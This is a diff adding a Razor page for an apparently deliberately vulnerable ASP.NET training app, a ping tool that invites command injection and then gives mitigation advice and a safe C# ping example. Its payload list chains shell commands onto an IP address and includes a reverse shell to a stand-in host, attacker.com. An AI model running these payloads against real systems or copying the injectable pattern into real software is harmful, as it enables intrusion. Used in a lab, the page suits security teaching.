@@ -1,0 +1,106 @@
+﻿@{
+    ViewData["Title"] = "Command Injection - Ping Tool";
+}
+
+<div class="container mt-4">
+    <h2><i class="fas fa-network-wired"></i> Vulnerable Ping Utility</h2>
+
+    <!-- Vulnerable command execution form -->
+    <form method="get" action="/CommandInjection/Ping" class="mb-4">
+        <div class="form-group">
+            <label for="ipAddress">IP Address or Host:</label>
+            <input type="text" class="form-control" id="ipAddress" name="ipAddress"
+                   placeholder="8.8.8.8" value="@Context.Request.Query["ipAddress"]">
+            <small class="form-text text-muted">Try appending commands with <code>&amp;&amp;</code>, <code>|</code>, or <code>;</code></small>
+        </div>
+        <button type="submit" class="btn btn-danger">Execute Ping</button>
+    </form>
+
+    @if (ViewBag.PingResult != null)
+    {
+        <div class="alert alert-warning">
+            <h5>Command Output:</h5>
+            <div class="p-3 bg-light border rounded" style="max-height: 300px; overflow: auto;">
+                <pre>@ViewBag.PingResult</pre>
+            </div>
+        </div>
+    }
+
+    <!-- Command Injection Test Cases -->
+    <div class="card mt-4">
+        <div class="card-header bg-danger text-white">
+            <i class="fas fa-terminal"></i> Command Injection Payloads
+        </div>
+        <div class="card-body">
+            <ul class="list-group">
+                <li class="list-group-item">
+                    <strong>Windows:</strong>
+                    <code>8.8.8.8 &amp;&amp; dir C:\</code>
+                </li>
+                <li class="list-group-item">
+                    <strong>Linux/Mac:</strong>
+                    <code>8.8.8.8; ls -la /</code>
+                </li>
+                <li class="list-group-item">
+                    <strong>Chain Commands:</strong>
+                    <code>127.0.0.1 | whoami</code>
+                </li>
+                <li class="list-group-item">
+                    <strong>Reverse Shell:</strong>
+                    <code>8.8.8.8 &amp;&amp; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1</code>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Security Recommendations -->
+    <div class="alert alert-info mt-4">
+        <h5><i class="fas fa-shield-alt"></i> Command Injection Protection</h5>
+        <ol>
+            <li><strong>Avoid</strong> directly executing user input as system commands</li>
+            <li>Use built-in APIs instead of shell commands (e.g., <code>System.Net.NetworkInformation.Ping</code>)</li>
+            <li>
+                If commands are necessary:
+                <ul>
+                    <li>Use allowlists for permitted characters</li>
+                    <li>Validate against a regex pattern</li>
+                    <li>Use parameterized commands with proper escaping</li>
+                </ul>
+            </li>
+            <li>Run application with least privileged permissions</li>
+        </ol>
+        <pre class="mt-2">// Safe ping example in C#
+var ping = new System.Net.NetworkInformation.Ping();
+var reply = ping.Send("8.8.8.8");
+var result = reply.Status == IPStatus.Success 
+    ? $"Reply from {reply.Address}" 
+    : "Ping failed";</pre>
+    </div>
+</div>
+
+@section Styles {
+    <style>
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+
+        .list-group-item code {
+            background: #f8d7da;
+            padding: 2px 5px;
+            border-radius: 3px;
+            color: #721c24;
+            font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
+        }
+
+        .form-text.text-muted code {
+            background: #e9ecef;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+    </style>
+}
